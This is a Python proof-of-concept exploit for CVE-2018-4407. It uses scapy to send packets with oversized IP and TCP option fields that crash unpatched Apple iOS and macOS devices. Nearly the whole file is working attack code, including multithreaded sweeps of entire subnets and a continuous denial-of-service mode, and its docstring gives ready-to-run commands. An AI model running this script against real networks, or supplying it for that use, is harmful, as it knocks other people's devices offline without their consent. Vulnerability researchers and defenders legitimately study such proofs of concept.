#!/usr/bin/python3

"""
CVE-2018-4407 (https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407)
Heap overflow in bad packet handling through ICMP response message.

This POC will crashes the vulnerable Apple devices by sending bad TCP packet
data containing long TCP/IP header options to overflow the ICMP message when
device try to send out the error message. You need the ability to send
network packet data directly to the device (e.g. on the same local network).

The following operating system versions and devices are vulnerable:
    - Apple iOS 11 and earlier: all devices
    - Apple macOS High Sierra, up to and including 10.13.6: all devices
    - Apple macOS Sierra, up to and including 10.12.6: all devices
    - Apple OS X El Capitan and earlier: all devices

Example:
$ chmod +x appledos.py
$ sudo ./appledos.py 192.168.1.0/24
$ sudo ./appledos.py --verbose 192.168.1.0/24
$ sudo ./appledos.py --continuous 192.168.1.0/24
$ sudo ./appledos.py --continuous --port 22 192.168.1.0/24
$ sudo ./appledos.py 192.168.1.118
$ sudo ./appledos.py --worker 10 192.168.1.0/24
"""
from scapy.all import IP, IPOption, send, TCP
from scapy.error import Scapy_Exception
from queue import Queue
from threading import Thread

import argparse
import ipaddress
import sys


class DOSWorker(Thread):

    def __init__(self, queue, port, verbose):
        Thread.__init__(self)
        self.queue = queue
        self.port = port
        self.verbose = verbose


    def send_packet(self, ipaddr):
        overflow = "A" * 18

        ip_header = IP(dst=str(ipaddr), options=[IPOption(overflow)])
        tcp_header = TCP(dport=self.port, options=[(1, overflow),(1, overflow)])

        try:
            send(ip_header/tcp_header, verbose=False)
            if self.verbose:
                print("Sent bad packet to {0}".format(ipaddr))
        except Scapy_Exception as e:
            msg = ""
            if "/dev/bpf" in str(e):
                msg = "You may want to reduce the worker number to 1 or 2"
            print("Packet to {0} error: {1}, {2}".format(ipaddr, e, msg))
        except PermissionError:
            print("Packet to {0} error: need to run as root".format(ipaddr))


    def run(self):
        while True:
            ipaddr = self.queue.get()
            try:
                self.send_packet(ipaddr)
            finally:
                self.queue.task_done()


def loop(ip, continuous, maximumWorkers, port, verbose):
    try:
        net = ipaddress.IPv4Network(ip)
    except ipaddress.AddressValueError as e:
        print("Error: {0}".format(e))
        return 1

    queue = Queue()

    for x in range(maximumWorkers):
        worker = DOSWorker(queue, port, verbose)
        worker.daemon = True
        worker.start()

    while True:
        for ipaddr in net:
            queue.put(ipaddr)
        if not continuous:
            break

    queue.join()

    return 0


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip",
                        help="IP address / CIDR")
    parser.add_argument("--continuous",
                        help="continuous DOS", action="store_true")
    parser.add_argument("--worker", type=int,
                        help="maximum workers (default: 100)")
    parser.add_argument("--port", type=int,
                        help="destination port (default: 80")
    parser.add_argument("--verbose",
                        help="shows IP after packet sent", action="store_true")
    args = parser.parse_args()

    ip = args.ip
    worker = args.worker
    port = args.port
    
    if not worker:
        worker = 100

    if not port:
        port = 80

    return loop(ip, args.continuous, worker, port, args.verbose)


if __name__ == '__main__':
    sys.exit(main())
